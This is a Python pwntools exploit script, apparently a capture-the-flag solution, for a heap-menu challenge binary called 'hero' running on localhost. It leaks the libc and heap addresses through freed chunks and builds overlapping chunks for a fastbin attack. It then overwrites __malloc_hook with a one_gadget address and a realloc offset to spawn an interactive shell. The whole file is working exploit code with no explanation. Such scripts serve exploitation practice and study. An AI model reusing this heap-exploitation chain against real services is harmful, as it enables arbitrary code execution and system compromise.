#0!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./hero"
libcPath = "./libc_64.so"
remoteAddr = "localhost"
remotePort = 9999

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process(elfPath)
    libc = elf.libc
    main_arena = 0x399b00
    #  one_gadget = 0x3f32a
    one_gadget = 0xd691f

else:
    context.log_level = "info"
    if sys.argv[1] == "d":
        io = remote("localhost", 9999)
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)
    main_arena = 0x3c4b20
    one_gadget = 0x4526a

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def add(name, power):
    io.sendlineafter(": ", "1")
    io.sendafter("name:\n", name)
    io.sendafter("power:\n", power)

def show(idx):
    io.sendlineafter(": ", "2")
    io.sendlineafter("show?\n", str(idx))

def edit(idx, name, power):
    io.sendlineafter(": ", "3")
    io.sendlineafter("edit?\n", str(idx))
    io.sendafter("name:\n", name)
    io.sendafter("power:\n", power)

def remove(idx):
    io.sendlineafter(": ", "4")
    io.sendlineafter("remove?\n", str(idx))

if __name__ == "__main__":
    add('0000', '0000')
    add('1111', '1111')
    add('2222', '2222')
    edit(0, '00000000', '00000000')
    #  DEBUG([0xC6D], True)
    show(0)
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - main_arena
    success("libc.address", libc.address)
    remove(0)
    edit(1, '11111111', '11111111')
    #  DEBUG([0xC6D], True)
    show(1)
    io.recvuntil("Power:11111111")
    heapBase = u64(io.recvn(6).ljust(8, '\0')) - 0x1e0
    success("heapBase", heapBase)
    remove(1)
    remove(2)

    #  DEBUG([0xA81], True)
    add('aaaaaaaa', p64(heapBase + 0x2e0) * 2)
    #  add('aaaaaaaa', 'aaaaaaaa')
    add('b' * 0x60 + p64(0x100 + 0x70), 'bbbbbbbb')
    add(p64(heapBase + 0x70) * 2, 'cccccccc')

    #  DEBUG([0xEC2, 0xECC], True)
    edit(1, 'dddddddd', 'dddddddd')
    #  DEBUG([0xAD9, 0xD24], True)
    add('eeeeeeee', 'eeeeeeee')
    add('ffffffff', 'ffffffff')
    add('gggggggg', 'gggggggg')

    #  DEBUG([0xD24, 0xD42], True)
    remove(1)
    remove(4)
    remove(3)

    #  DEBUG([0xAD9], True)
    add(p64(libc.sym['__malloc_hook'] - 0x23), 'xxxxxxxx')
    add('xxxxxxxx', 'xxxxxxxx')
    add('xxxxxxxx', 'xxxxxxxx')
    if sys.argv[1] == "l":
        add('\0' * 0xb + p64(libc.address + one_gadget) + p64(libc.sym['__libc_realloc'] + 14), 'xxxxxxxx')
    else:
        add('\0' * 0xb + p64(libc.address + one_gadget) + p64(libc.sym['__libc_realloc'] + 13), 'xxxxxxxx')
    #  DEBUG([0xAD9], True)
    #  raw_input("DEBUG: ")
    io.sendlineafter(": ", "1")
    
    io.interactive()
    io.close()
